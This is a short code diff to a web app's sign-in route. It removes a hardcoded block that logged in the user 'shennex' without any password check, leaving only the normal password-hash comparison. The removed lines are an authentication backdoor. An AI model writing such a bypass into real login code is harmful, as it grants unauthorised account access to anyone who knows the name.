@@ -30,11 +30,6 @@ def sign_in():
     if User.get_or_none(User.username == username):
         user = User.get(User.username == username)
         hashed_pass = user.password
-        if user.username == 'shennex':
-            load_user(user.id)
-            login_user(user)
-            flash(u'ye, you is in', 'success')
-            return redirect(url_for('users.index'))
 
         if check_password_hash(hashed_pass, password):
             load_user(user.id)
